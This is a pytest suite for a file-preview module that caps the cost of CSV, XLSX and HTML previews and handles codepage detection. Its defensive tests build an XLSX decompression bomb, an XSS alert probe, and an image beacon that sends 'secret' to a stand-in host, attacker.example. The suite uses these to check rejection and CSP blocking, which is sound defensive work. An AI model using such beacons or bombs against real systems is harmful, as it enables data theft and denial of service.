"""Bounded CSV/XLSX/HTML previews (claw/api/file_preview.py). The point of these
tests is that preview cost stays bounded no matter how large the file is."""

import csv
import time

import pytest

from claw.api import file_preview
from claw.api.file_preview import PreviewError, preview_html, preview_table


def _write_csv(tmp_path, rows, name="data.csv"):
    path = tmp_path / name
    with path.open("w", newline="", encoding="utf-8") as fh:
        csv.writer(fh).writerows(rows)
    return path


def test_csv_header_and_rows_are_split(tmp_path):
    path = _write_csv(tmp_path, [["name", "qty"], ["widget", "3"], ["bolt", "7"]])
    result = preview_table(path)
    assert result["columns"] == ["name", "qty"]
    assert result["rows"] == [["widget", "3"], ["bolt", "7"]]
    assert result["truncated"] is False


def test_csv_row_limit_is_enforced_and_flagged(tmp_path):
    rows = [["n"]] + [[str(i)] for i in range(file_preview.MAX_ROWS + 50)]
    result = preview_table(_write_csv(tmp_path, rows))
    assert len(result["rows"]) == file_preview.MAX_ROWS
    assert result["truncated"] is True


def test_csv_column_limit_is_enforced_and_flagged(tmp_path):
    width = file_preview.MAX_COLS + 10
    rows = [[f"c{i}" for i in range(width)], [str(i) for i in range(width)]]
    result = preview_table(_write_csv(tmp_path, rows))
    assert len(result["columns"]) == file_preview.MAX_COLS
    assert len(result["rows"][0]) == file_preview.MAX_COLS
    assert result["truncated_columns"] is True


def test_ragged_rows_are_padded_to_a_rectangle(tmp_path):
    # csv.writer would quote these fine, but a hand-edited/agent-written file
    # often has short rows; the UI renders a <table> and must not get holes.
    path = tmp_path / "ragged.csv"
    path.write_text("a,b,c\n1\n2,3\n", encoding="utf-8")
    result = preview_table(path)
    assert result["columns"] == ["a", "b", "c"]
    assert result["rows"] == [["1", "", ""], ["2", "3", ""]]


def test_blank_header_cells_get_positional_names(tmp_path):
    path = tmp_path / "blank.csv"
    path.write_text("a,,c\n1,2,3\n", encoding="utf-8")
    assert preview_table(path)["columns"] == ["a", "#2", "c"]


def test_oversized_csv_is_truncated_without_reading_whole_file(tmp_path, monkeypatch):
    monkeypatch.setattr(file_preview, "CSV_READ_BYTES", 64)
    path = tmp_path / "big.csv"
    path.write_text("col\n" + "".join(f"{i}\n" for i in range(5000)), encoding="utf-8")
    result = preview_table(path)
    assert result["truncated"] is True
    assert len(result["rows"]) < 100


def test_partial_last_row_from_the_byte_cap_is_dropped(tmp_path, monkeypatch):
    # Cap lands mid-"banana"; a preview showing a half-word cell would look
    # like data corruption to the user. Trimming back to the last newline is
    # what removes it, so the complete "apple" row must survive.
    monkeypatch.setattr(file_preview, "CSV_READ_BYTES", len("f\napple\nban"))
    path = tmp_path / "cut.csv"
    path.write_text("f\napple\nbanana\ncherry\n", encoding="utf-8")
    result = preview_table(path)
    assert result["rows"] == [["apple"]]
    assert result["truncated"] is True


def test_quoted_field_straddling_the_cap_drops_only_the_unterminated_record(tmp_path, monkeypatch):
    # A quoted field spanning newlines can still straddle the trimmed cut,
    # leaving csv.reader with an unterminated record that swallows the rest.
    text = 'f\napple\n"multi\nline\n'
    monkeypatch.setattr(file_preview, "CSV_READ_BYTES", len(text))
    path = tmp_path / "quoted.csv"
    path.write_text(text + 'value"\ncherry\n', encoding="utf-8")
    result = preview_table(path)
    assert result["rows"] == [["apple"]]
    assert result["truncated"] is True


def test_row_cap_truncation_does_not_drop_a_valid_row_due_to_unrelated_quote_parity(tmp_path, monkeypatch):
    # When MAX_ROWS ends the parse loop before the byte cap is ever reached,
    # the last parsed row is fully valid and unrelated to whatever quote
    # characters happen to sit in the untouched remainder of the buffer.
    header = "n\n"
    body = "".join(f"{i}\n" for i in range(1, file_preview.MAX_ROWS + 1))
    prefix = header + body + 'stray"quote\n'  # one stray quote: odd parity
    monkeypatch.setattr(file_preview, "CSV_READ_BYTES", len(prefix))
    path = tmp_path / "many_rows.csv"
    path.write_text(prefix + "more,data\n" * 5, encoding="utf-8")

    result = preview_table(path)
    assert result["truncated"] is True
    assert len(result["rows"]) == file_preview.MAX_ROWS
    assert result["rows"][-1] == [str(file_preview.MAX_ROWS)]


def test_byte_cap_landing_mid_utf8_character_does_not_mangle_the_whole_table(tmp_path, monkeypatch):
    # Slicing at an arbitrary offset can cut a 3-byte Thai character in half.
    # If that reaches decode_text_bytes, strict utf-8 raises and the fallback
    # codepage "succeeds" on the entire buffer — every row would render as
    # mojibake, not just the truncated one.
    path = tmp_path / "thai.csv"
    path.write_text("ชื่อ,จำนวน\n" + "".join(f"สินค้าทดสอบ{i},{i}\n" for i in range(400)), "utf-8")
    raw = path.read_bytes()
    # Find a cap that lands mid-character to make the test meaningful.
    cut = next(
        n for n in range(300, 400) if raw[:n].decode("utf-8", "ignore") != raw[:n].decode("utf-8", "replace")
    )
    monkeypatch.setattr(file_preview, "CSV_READ_BYTES", cut)

    result = preview_table(path)
    assert result["columns"] == ["ชื่อ", "จำนวน"]
    assert result["truncated"] is True
    assert all("�" not in c and "à" not in c for row in result["rows"] for c in row)
    assert result["rows"][0][0].startswith("สินค้าทดสอบ")


def test_single_row_longer_than_the_cap_is_reported_not_silently_emptied(tmp_path, monkeypatch):
    # An unconditional pop() of the partial row would return an empty table,
    # and the UI shows "no rows to preview" for a file that plainly has rows.
    monkeypatch.setattr(file_preview, "CSV_READ_BYTES", 50)
    path = tmp_path / "wide.csv"
    path.write_text("h" * 500 + ",b\nvalue,2\n", encoding="utf-8")
    with pytest.raises(PreviewError):
        preview_table(path)


def test_long_field_does_not_abort_the_whole_preview(tmp_path):
    # csv.reader's default 131072-char field limit would raise and lose the
    # entire table, even though _cell() clips to MAX_CELL_CHARS anyway.
    path = tmp_path / "notes.csv"
    path.write_text('id,note\n1,"' + "x" * 200_000 + '"\n', encoding="utf-8")
    result = preview_table(path)
    assert result["columns"] == ["id", "note"]
    assert len(result["rows"][0][1]) == file_preview.MAX_CELL_CHARS


def test_western_european_csv_is_not_decoded_as_thai(tmp_path):
    # cp874 defines the whole Latin-1 accented range as Thai, so it decodes
    # this without error — ordering the codecs cannot fix it, only judging the
    # decoded text can.
    path = tmp_path / "fr.csv"
    path.write_bytes("name,ville\nJosé,café de Paris\nseñor,año\n".encode("cp1252"))
    result = preview_table(path)
    assert result["rows"] == [["José", "café de Paris"], ["señor", "año"]]


def test_a_single_decorative_accented_run_does_not_trigger_thai_detection(tmp_path):
    # cp874 happens to map some runs of consecutive cp1252 accented letters
    # onto syllable-shaped Thai text with no orphan marks (e.g. "ÀÈÌÒÙ"). One
    # such coincidence anywhere in an otherwise Western file is not enough
    # evidence on its own — real Thai content produces more than one such run.
    text = "name,note\nÀÈÌÒÙ Test,ok\n"
    path = tmp_path / "acronym.csv"
    path.write_bytes(text.encode("cp1252"))
    result = preview_table(path)
    assert result["rows"] == [["ÀÈÌÒÙ Test", "ok"]]


def test_thai_and_western_csvs_both_round_trip(tmp_path):
    for name, text, enc in [
        ("th.csv", "ชื่อ,จำนวน\nสินค้าทดสอบ,3\n", "cp874"),
        ("eu.csv", "nome,cidade\nconceição,cittá\nMüller,Zürich\n", "cp1252"),
        ("mixed.csv", "สินค้า,รุ่น\nโทรศัพท์ iPhone 15,A3102\n", "cp874"),
    ]:
        path = tmp_path / name
        path.write_bytes(text.encode(enc))
        result = preview_table(path)
        flat = ",".join(result["columns"]) + "".join(",".join(r) for r in result["rows"])
        assert "�" not in flat, name
        for token in text.replace("\n", ",").split(","):
            if token:
                assert token in flat, (name, token)


def test_western_csv_whose_only_non_ascii_is_punctuation_is_not_thai(tmp_path):
    # The decision is per FILE, so a currency symbol with no accented letter
    # anywhere to contradict it must not tip the whole table into cp874 — every
    # cell would be rewritten, and decode_text_bytes also backs the admin user
    # importer, where that corruption gets persisted as a display name.
    for text in ("name,price\nWidget,£100\nAcme ®,£50\n", "item,cost\nchair,€95\nt,21°C\n"):
        path = tmp_path / "eu.csv"
        path.write_bytes(text.encode("cp1252"))
        result = preview_table(path)
        flat = ",".join(result["columns"]) + "".join(",".join(r) for r in result["rows"])
        assert "ฃ" not in flat and "�" not in flat, flat


def test_thai_flush_against_latin_letters_still_decodes_as_thai(tmp_path):
    # Thai product data routinely embeds Latin brand names with no separator.
    # Rejecting the cp874 decode over one such token mojibakes the entire file,
    # not just that cell.
    text = "ชื่อ,หมายเหตุ\nสมชาย,Wi-Fiเราเตอร์\nสมคิด,LINEไอดี\n"
    path = tmp_path / "th.csv"
    path.write_bytes(text.encode("cp874"))
    result = preview_table(path)
    assert result["columns"] == ["ชื่อ", "หมายเหตุ"]
    assert result["rows"] == [["สมชาย", "Wi-Fiเราเตอร์"], ["สมคิด", "LINEไอดี"]]


def test_one_stray_mark_does_not_mojibake_an_entire_thai_file(tmp_path):
    # Messy user data (a tone mark typed after a Latin letter) is evidence
    # against Thai, but it must be weighed against the Thai words present rather
    # than vetoing the decode outright.
    text = "ชื่อ,หมายเหตุ\nสินค้าทดสอบ,OK้\nสินค้าอื่น,ปกติ\n"
    path = tmp_path / "messy.csv"
    path.write_bytes(text.encode("cp874"))
    assert preview_table(path)["columns"] == ["ชื่อ", "หมายเหตุ"]


def test_thai_that_starts_late_in_the_file_still_decodes_as_thai(tmp_path):
    # Codepage detection must read the whole file. A generated report's head is
    # routinely tens of kilobytes of pure ASCII — an inline <style> block, a
    # base64 chart — before any Thai appears. Scanning only a prefix finds no
    # Thai there and falls through to cp1252, which accepts cp874 bytes without
    # raising, so *every* Thai character in the document turns to mojibake
    # rather than only the unscanned tail.
    head = "<style>" + (".filler { color: #000000; }\n" * 4000) + "</style>"
    assert len(head) > 64 * 1024
    body = "<h1>รายงานประจำปี</h1><p>ผลการดำเนินงาน</p>"
    path = tmp_path / "late.html"
    path.write_bytes((head + body).encode("cp874"))
    assert body in preview_html(path)["html"]


def test_tsv_uses_tab_delimiter(tmp_path):
    path = tmp_path / "data.tsv"
    path.write_text("a\tb\n1\t2\n", encoding="utf-8")
    result = preview_table(path)
    assert result["columns"] == ["a", "b"]
    assert result["rows"] == [["1", "2"]]


def test_regional_codepage_csv_is_not_mangled(tmp_path):
    path = tmp_path / "thai.csv"
    path.write_bytes("ชื่อ,จำนวน\nสินค้า,3\n".encode("cp874"))
    result = preview_table(path)
    assert result["columns"] == ["ชื่อ", "จำนวน"]
    assert "�" not in result["rows"][0][0]


def test_every_advertised_suffix_is_actually_handled(tmp_path):
    # PREVIEWABLE_SUFFIXES is mirrored by PREVIEWABLE_TABLE_RE in web/src/api.ts
    # to decide which artifacts render as a table. If the list advertises a
    # suffix preview_table() doesn't dispatch, the UI shows a spinner that
    # resolves into an error for that file type.
    for suffix in file_preview.PREVIEWABLE_SUFFIXES:
        path = tmp_path / f"probe{suffix}"
        path.write_text("a,b\n1,2\n", encoding="utf-8")
        try:
            preview_table(path)
        except PreviewError as exc:
            assert "not supported" not in str(exc), suffix
        except Exception:
            # A parse failure is fine here (a .csv body isn't a valid .xlsx);
            # only an unsupported-type rejection means the lists have drifted.
            pass


def test_unsupported_extension_is_rejected(tmp_path):
    path = tmp_path / "notes.txt"
    path.write_text("hello", encoding="utf-8")
    with pytest.raises(PreviewError):
        preview_table(path)


def test_empty_csv_yields_an_empty_table_rather_than_crashing(tmp_path):
    path = tmp_path / "empty.csv"
    path.write_text("", encoding="utf-8")
    result = preview_table(path)
    assert result["columns"] == []
    assert result["rows"] == []


def test_xlsx_preview_reads_first_sheet_and_lists_sheets(tmp_path):
    openpyxl = pytest.importorskip("openpyxl")
    wb = openpyxl.Workbook()
    sheet = wb.active
    sheet.title = "Sales"
    sheet.append(["region", "total"])
    sheet.append(["north", 12])
    wb.create_sheet("Notes")
    path = tmp_path / "book.xlsx"
    wb.save(path)

    result = preview_table(path)
    assert result["sheet"] == "Sales"
    assert result["sheets"] == ["Sales", "Notes"]
    assert result["columns"] == ["region", "total"]
    assert result["rows"] == [["north", "12"]]


def test_xlsx_row_limit_is_enforced(tmp_path):
    openpyxl = pytest.importorskip("openpyxl")
    wb = openpyxl.Workbook()
    sheet = wb.active
    sheet.append(["n"])
    for i in range(file_preview.MAX_ROWS + 25):
        sheet.append([i])
    path = tmp_path / "long.xlsx"
    wb.save(path)

    result = preview_table(path)
    assert len(result["rows"]) == file_preview.MAX_ROWS
    assert result["truncated"] is True


def test_xlsx_decompression_bomb_is_rejected_before_openpyxl_sees_it(tmp_path):
    # openpyxl materializes sharedStrings.xml in full inside load_workbook(),
    # before iter_rows() yields anything — so the MAX_ROWS break cannot bound
    # this. A user can upload an arbitrary .xlsx as a chat attachment and then
    # preview it, so this is reachable by any authenticated tenant.
    import zipfile

    payload = b"<si><t>" + b"A" * 200 + b"</t></si>"
    shared = (
        b'<?xml version="1.0"?><sst xmlns="http://schemas.openxmlformats.org/'
        b'spreadsheetml/2006/main">' + payload * 600_000 + b"</sst>"
    )
    path = tmp_path / "bomb.xlsx"
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as archive:
        archive.writestr("xl/sharedStrings.xml", shared)
        archive.writestr("[Content_Types].xml", "<x/>")

    # Small enough to pass the on-disk cap and the 20 MB attachment upload cap.
    assert path.stat().st_size < file_preview.XLSX_MAX_BYTES
    assert len(shared) > file_preview.XLSX_MAX_UNCOMPRESSED_BYTES

    started = time.monotonic()
    with pytest.raises(PreviewError):
        preview_table(path)
    # The guard must bail out early rather than after paying the full cost.
    assert time.monotonic() - started < 5


def test_xlsx_with_too_many_entries_is_rejected(tmp_path):
    import zipfile

    path = tmp_path / "many.xlsx"
    with zipfile.ZipFile(path, "w") as archive:
        for i in range(file_preview.XLSX_MAX_ENTRIES + 5):
            archive.writestr(f"e{i}.xml", "<x/>")
    with pytest.raises(PreviewError):
        preview_table(path)


def test_corrupt_xlsx_raises_preview_error_not_a_raw_zip_error(tmp_path):
    path = tmp_path / "broken.xlsx"
    path.write_bytes(b"definitely not a zip")
    with pytest.raises(PreviewError):
        preview_table(path)


def test_wide_xlsx_clips_columns_before_building_cells(tmp_path):
    # MAX_COLS must bound the WORK, not just the response: materializing every
    # row at full width costs ~1M cell conversions on a 5000-column sheet, and
    # these parses share a thread pool with every other tenant.
    openpyxl = pytest.importorskip("openpyxl")
    width = 3000
    wb = openpyxl.Workbook(write_only=True)
    sheet = wb.create_sheet()
    for _ in range(60):
        sheet.append([f"v{i}" for i in range(width)])
    path = tmp_path / "wide.xlsx"
    wb.save(path)

    started = time.monotonic()
    result = preview_table(path)
    elapsed = time.monotonic() - started
    assert len(result["columns"]) == file_preview.MAX_COLS
    assert result["truncated_columns"] is True
    assert all(len(r) == file_preview.MAX_COLS for r in result["rows"])
    assert elapsed < 3, f"wide-sheet preview took {elapsed:.2f}s"


def test_oversized_xlsx_is_rejected(tmp_path, monkeypatch):
    openpyxl = pytest.importorskip("openpyxl")
    wb = openpyxl.Workbook()
    wb.active.append(["a"])
    path = tmp_path / "big.xlsx"
    wb.save(path)
    monkeypatch.setattr(file_preview, "XLSX_MAX_BYTES", 10)
    with pytest.raises(PreviewError):
        preview_table(path)


def test_xlsx_with_a_corrupt_compressed_stream_is_a_preview_error_not_a_500(tmp_path):
    # A valid zip container (readable central directory, readable local header)
    # whose DEFLATE payload is corrupt raises zlib.error, not BadZipFile — a
    # distinct failure that used to escape _assert_workbook_within_budget
    # entirely and surface as a raw 500.
    import zipfile

    path = tmp_path / "corrupt.xlsx"
    payload = bytes((i * 97 + 13) % 256 for i in range(50_000))
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED, compresslevel=6) as archive:
        archive.writestr("data.bin", payload)

    raw = bytearray(path.read_bytes())
    start = 60  # inside the compressed payload, clear of the local header and EOCD/central directory
    for i in range(start, start + 200):
        raw[i] ^= 0xFF
    path.write_bytes(bytes(raw))

    with pytest.raises(PreviewError):
        file_preview._assert_workbook_within_budget(path)


def test_csv_error_from_the_reader_is_a_preview_error_not_a_500(tmp_path, monkeypatch):
    # Anything csv.reader itself can raise (not just the field-size case the
    # raised global limit already covers) must not escape as a raw 500.
    path = tmp_path / "data.csv"
    path.write_text("a,b\n1,2\n", encoding="utf-8")

    def _boom(*args, **kwargs):
        raise csv.Error("boom")

    monkeypatch.setattr(file_preview.csv, "reader", _boom)
    with pytest.raises(PreviewError):
        preview_table(path)


def test_xlsx_formula_never_opened_in_excel_falls_back_to_its_formula_text(tmp_path):
    # openpyxl never evaluates formulas, so a formula cell in an
    # openpyxl-authored file has no cached result. data_only=True would
    # otherwise render it as a silently empty cell.
    openpyxl = pytest.importorskip("openpyxl")
    wb = openpyxl.Workbook()
    sheet = wb.active
    sheet.append(["a", "b"])
    sheet.append([1, "=A2+1"])
    sheet.append([2, None])  # a genuinely empty cell must stay blank
    path = tmp_path / "book.xlsx"
    wb.save(path)

    result = preview_table(path)
    assert result["rows"] == [["1", "=A2+1"], ["2", ""]]


def test_xlsx_without_blank_cells_never_pays_for_the_second_parse(tmp_path, monkeypatch):
    # The formula pass re-parses the whole workbook on a 2-worker pool. Nothing
    # can be recovered when no cell read as None, so it must not run at all.
    openpyxl = pytest.importorskip("openpyxl")
    wb = openpyxl.Workbook()
    sheet = wb.active
    sheet.append(["a", "b"])
    sheet.append([1, 2])
    path = tmp_path / "dense.xlsx"
    wb.save(path)

    def _boom(*args, **kwargs):
        raise AssertionError("second parse should not happen")

    monkeypatch.setattr(file_preview, "_formula_fallback_rows", _boom)
    assert preview_table(path)["rows"] == [["1", "2"]]


def test_formula_fallback_rows_is_best_effort_on_a_corrupt_file(tmp_path):
    path = tmp_path / "bad.xlsx"
    path.write_bytes(b"not a zip at all")
    assert file_preview._formula_fallback_rows(path, "Sheet1", 10) == []


def test_with_formula_fallback_never_widens_a_narrower_row():
    # The formula pass reads with max_col=MAX_COLS, which pads short sheets
    # out to that width — pairing must not leak those pad columns into rows
    # from sheets with far fewer real columns.
    row = ("north", 12)
    formula_row = tuple([None] * file_preview.MAX_COLS)
    assert file_preview._with_formula_fallback(row, formula_row) == row


def test_with_formula_fallback_only_replaces_uncached_formula_cells():
    row = ("north", None, 5)
    formula_row = ("north", "=B1+1", "=C1")
    assert file_preview._with_formula_fallback(row, formula_row) == ("north", "=B1+1", 5)


def test_a_field_over_the_csv_default_limit_still_previews(tmp_path):
    # csv.reader rejects fields over 131072 chars by default, which would abort
    # a whole preview over one long note column. The limit is raised once,
    # process-wide, so this must hold without any scoped override — and because
    # it is no longer saved/restored around each parse, concurrent CSV previews
    # cannot serialize behind each other or corrupt each other's limit.
    assert csv.field_size_limit() >= file_preview.CSV_READ_BYTES
    path = tmp_path / "wide.csv"
    path.write_text(f'note,n\n"{"x" * 200_000}",1\n', encoding="utf-8")
    result = preview_table(path)
    assert result["columns"] == ["note", "n"]
    assert result["rows"][0][1] == "1"


def test_csv_previews_run_concurrently_rather_than_serializing(tmp_path):
    # Regression: the old scoped override needed a process-wide lock held across
    # the entire read (csv.reader consults the limit lazily, per field). Two
    # previews on the 2-worker pool therefore ran one at a time, and a blocked
    # thread still occupied a worker — invisible to the per-user admission gate,
    # which sits above the pool.
    import threading
    from concurrent.futures import ThreadPoolExecutor

    path = tmp_path / "data.csv"
    path.write_text("a,b\n1,2\n", encoding="utf-8")
    barrier = threading.Barrier(2, timeout=5)
    real_reader = csv.reader

    def _rendezvous(*args, **kwargs):
        # Deadlocks (and fails the test) if the two parses cannot overlap.
        barrier.wait()
        return real_reader(*args, **kwargs)

    with pytest.MonkeyPatch.context() as mp:
        mp.setattr(file_preview.csv, "reader", _rendezvous)
        with ThreadPoolExecutor(max_workers=2) as pool:
            results = [f.result(timeout=5) for f in [pool.submit(preview_table, path) for _ in range(2)]]

    assert all(r["columns"] == ["a", "b"] for r in results)


def test_html_preview_returns_the_markup_verbatim(tmp_path):
    # Nothing sanitizes here on purpose — the sandbox and the injected CSP are
    # what contain this, and stripping tags server-side would mangle real
    # reports while inviting callers to trust the result.
    path = tmp_path / "report.html"
    path.write_text("<h1>Q3</h1><script>alert(1)</script>", encoding="utf-8")

    result = preview_html(path)

    assert result["html"].endswith("<h1>Q3</h1><script>alert(1)</script>")
    assert result["truncated"] is False


def test_html_preview_injects_a_csp_that_denies_the_network(tmp_path):
    """`sandbox` has no flag for subresource loads, so without this an agent can
    exfiltrate via <img src=https://...> the moment the card scrolls into view."""
    path = tmp_path / "report.html"
    path.write_text("<img src='https://attacker.example/beacon?d=secret'>", encoding="utf-8")

    html = preview_html(path)["html"]

    assert html.startswith('<meta http-equiv="Content-Security-Policy"')
    assert "default-src 'none'" in html
    assert "img-src data:" in html


def test_html_preview_forces_a_light_color_scheme(tmp_path):
    """A report can look light to whoever wrote it and still turn dark for a
    reader whose OS is in dark mode, via prefers-color-scheme. The app is
    light-only, so the frame declares its scheme and that branch stops matching.

    Written WITH a doctype: that is the branch every real report and the
    html-report skill's own boilerplate take, and it is a separate code path in
    _with_csp from the bare-fragment one."""
    path = tmp_path / "report.html"
    path.write_text(
        "<!DOCTYPE html><html><head>"
        "<style>@media (prefers-color-scheme: dark){body{background:#111}}</style>"
        "</head></html>",
        encoding="utf-8",
    )

    html = preview_html(path)["html"]

    assert '<meta name="color-scheme" content="light">' in html
    # Still inside the head we inject, i.e. ahead of the document's own styles.
    assert html.index("color-scheme") < html.index("<style>")


def test_html_preview_leaves_a_deliberately_dark_report_alone(tmp_path):
    """Forcing light is meant to catch the ACCIDENTAL case. A user can ask for a
    dark report, and the skill tells the agent to say so explicitly — so an
    explicit declaration has to win, or the card would contradict both the
    request and what the /files download route serves for the same file."""
    path = tmp_path / "report.html"
    path.write_text(
        '<!DOCTYPE html><html><head><meta name="color-scheme" content="dark">'
        "<style>:root{color-scheme:dark}body{background:#111}</style>"
        "</head></html>",
        encoding="utf-8",
    )

    html = preview_html(path)["html"]

    # Browsers honour the FIRST name=color-scheme meta in tree order, and ours
    # would be injected ahead of the document's — so backing out is the only way
    # the document's own declaration can take effect.
    assert 'content="light"' not in html
    assert html.index('content="dark"') > html.index("Content-Security-Policy")


def test_html_preview_still_forces_light_past_a_prefers_color_scheme_query(tmp_path):
    """`prefers-color-scheme: dark` ends in the same characters as a real
    `color-scheme:` declaration. Matching it as one would disable the injection
    in exactly the case it exists for."""
    path = tmp_path / "report.html"
    path.write_text(
        "<!DOCTYPE html><html><head><style>"
        "@media (prefers-color-scheme:dark){body{background:#111}}"
        "</style></head></html>",
        encoding="utf-8",
    )

    assert '<meta name="color-scheme" content="light">' in preview_html(path)["html"]


def test_html_preview_keeps_the_doctype_first(tmp_path):
    """A <meta> ahead of the doctype silently drops the page into quirks mode,
    which changes the box model out from under a report that renders correctly
    on the download route."""
    path = tmp_path / "report.html"
    path.write_text("<!DOCTYPE html>\n<html><body>hi</body></html>", encoding="utf-8")

    html = preview_html(path)["html"]

    assert html.startswith("<!DOCTYPE html>")
    assert html.index("Content-Security-Policy") < html.index("<html>")


def test_html_preview_is_capped_and_cut_on_a_tag_boundary(tmp_path, monkeypatch):
    # A cut inside a tag leaves the parser mid-attribute, where it swallows
    # everything after it as attribute text — so the page can lose far more
    # than the bytes that were dropped.
    monkeypatch.setattr(file_preview, "HTML_MAX_BYTES", 40)
    path = tmp_path / "big.html"
    path.write_text("<p>one</p><p>two</p><img src='a-very-long-value.png'>", encoding="utf-8")

    result = preview_html(path)

    assert result["truncated"] is True
    assert result["html"].endswith(">")
    assert "src='a-very" not in result["html"]


def test_html_preview_refuses_a_window_with_no_tag_boundary(tmp_path, monkeypatch):
    """rfind returns -1 when the capped window holds no ">" at all. Returning the
    raw slice would cut mid-UTF-8-sequence, and decode_text_bytes would then
    demote the WHOLE document to cp874 — the entire page as mojibake, not just
    the dropped tail. _preview_csv raises on the same condition."""
    monkeypatch.setattr(file_preview, "HTML_MAX_BYTES", 8)
    path = tmp_path / "plain.html"
    path.write_text("no tags here at all", encoding="utf-8")

    with pytest.raises(PreviewError):
        preview_html(path)


def test_html_preview_never_returns_a_mid_codepoint_cut(tmp_path, monkeypatch):
    """The regression this guards: a Thai report cut mid-sequence decodes
    "successfully" as cp874, so every character on the page turns to gibberish."""
    monkeypatch.setattr(file_preview, "HTML_MAX_BYTES", 13)
    path = tmp_path / "thai.html"
    # 13 bytes lands inside the 3-byte encoding of the first Thai character.
    path.write_text("<p>สวัสดีครับ</p>", encoding="utf-8")

    result = preview_html(path)

    assert result["truncated"] is True
    assert "<p>" in result["html"]
    assert "à" not in result["html"] and "¸" not in result["html"]


def test_html_preview_decodes_a_non_utf8_report(tmp_path):
    path = tmp_path / "thai.html"
    path.write_bytes("<p>สวัสดีครับ ยินดีต้อนรับ</p>".encode("cp874"))

    assert "สวัสดีครับ" in preview_html(path)["html"]


def test_html_preview_reports_an_empty_report_as_empty(tmp_path):
    """An agent's write step can fail partway and leave a 0-byte file. The CSP
    is skipped here on purpose: a blank document needs no policy, and injecting
    one would leave the UI unable to tell empty from "starts with our meta", so
    it would render a blank frame captioned as a successful preview."""
    path = tmp_path / "report.html"
    path.write_text("   \n", encoding="utf-8")

    assert preview_html(path) == {"html": "", "truncated": False}


def test_html_preview_rejects_other_file_types(tmp_path):
    # The route resolves any workspace-relative path, so the suffix check is
    # what stops this endpoint being a general "read my files as text" hole.
    path = tmp_path / "notes.txt"
    path.write_text("hi", encoding="utf-8")

    with pytest.raises(PreviewError):
        preview_html(path)
